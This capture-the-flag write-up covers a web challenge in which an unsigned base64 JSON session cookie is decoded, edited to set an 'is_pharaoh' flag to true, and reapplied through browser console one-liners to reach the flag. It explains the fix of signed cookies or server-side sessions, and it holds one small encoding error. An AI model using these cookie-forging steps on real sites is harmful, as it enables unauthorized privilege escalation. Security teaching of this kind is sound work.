# Ramesses / Pharaoh Login

**Category:** Web Exploitation

## Overview

This challenge centered around a thematically rich "Pharaoh's Tomb" login interface. The objective was to authenticate as someone worthy enough to enter the tomb and reveal the flag. The vulnerability lay not in server-side authentication but in how the server trusted a client-controlled cookie. The site encoded user data in base64 but did not secure or validate it, allowing full privilege escalation simply by editing the cookie in the browser.

This challenge was essentially a lesson in why unsafely trusting client-side cookies leads to total compromise.

## Exploration & Initial Observations

Upon entering a username and password, the site transitioned to a "cursed screen." During this navigation, I noticed that the page set a cookie named `session`. Checking DevTools → Application → Cookies showed a long base64-looking string that always began with:

```
eyJ...
```

This prefix (`eyJ`) is a hallmark of base64-encoded JSON because:

```
"{" → base64 → eyJ7
```

This was the first sign that the cookie was not encrypted, only encoded.

The question then became: What data is being stored inside this cookie? And more importantly: Is it trusted by the server?

## Decoding the Cookie

Using DevTools → Console:

```javascript
const v = decodeURIComponent(document.cookie.split('session=')[1]);
atob(v);
```

This revealed:

```json
{"name":"password","worthy":false}
```

or in some attempts:

```json
{"name":"password","is_pharaoh":false}
```

This immediately exposed the vulnerability:

- The server was not verifying a server-side session
- The server was simply reading the cookie's JSON and using the field `is_pharaoh` (or `worthy`) to decide whether to show the flag

There was no signing, no MAC, no hashing, no server check, just base64 encoding.

So the attack surface was clear: modify the boolean.

## Privilege Escalation via Cookie Manipulation

To become a pharaoh, the goal was to rewrite:

```json
{"name":"password","is_pharaoh": true}
```

Then re-base64 encode it:

```
eyJuYW1lIjogInBhc3N3b3JkIiwgImlzX3BoYXJhb2giOiB0cnVlfQ==
```

To apply it:

```javascript
document.cookie = 'session=eyJuYW1lIjogInBhc3N3b3JkIiwgImlzX3BoYXJhb2giOiB0cnVlfQ==; path=/';
location.reload();
```

Upon refresh, the site redirected directly to the inner tomb, displaying the flag.

The vulnerability was complete client-side trust, a classic beginner web flaw.

## Why This Works

Web applications should never store trust-defining attributes directly inside readable client cookies, because:

- Cookies can be modified
- Base64 is not encryption
- JSON can be rewritten trivially
- Any user can impersonate any role without authorization checks

The server must implement HMAC-signed cookies, JWTs with signatures, or server-side session storage. None were present here.

## How AI Assisted

AI significantly accelerated this challenge in three specific ways:

### 1. Cookie Structure Identification

When I observed the cookie, AI instantly recognized `eyJ` as base64-encoded JSON and explained the expected structure, saving time that might have been spent guessing or inspecting it byte-by-byte.

### 2. Decoding / Encoding Guidance

AI provided exact one-liners for decoding base64 in the browser, re-encoding the modified JSON, and applying the updated cookie, ensuring accuracy and avoiding syntax errors.

### 3. Vulnerability Explanation

AI explained why the vulnerability existed (lack of cookie signing), helping me understand the security principle behind the exploit rather than only performing the mechanical steps.

This combination of technical insight and procedural efficiency made the process straightforward even as a newcomer to web security.

## Flag

After updating the cookie and refreshing the tomb page, the challenge displayed the correct flag.

---

**Tools Used:** Browser DevTools, JavaScript console, base64 encoding  
**Skills:** Cookie manipulation, base64 decoding, client-side security, privilege escalation
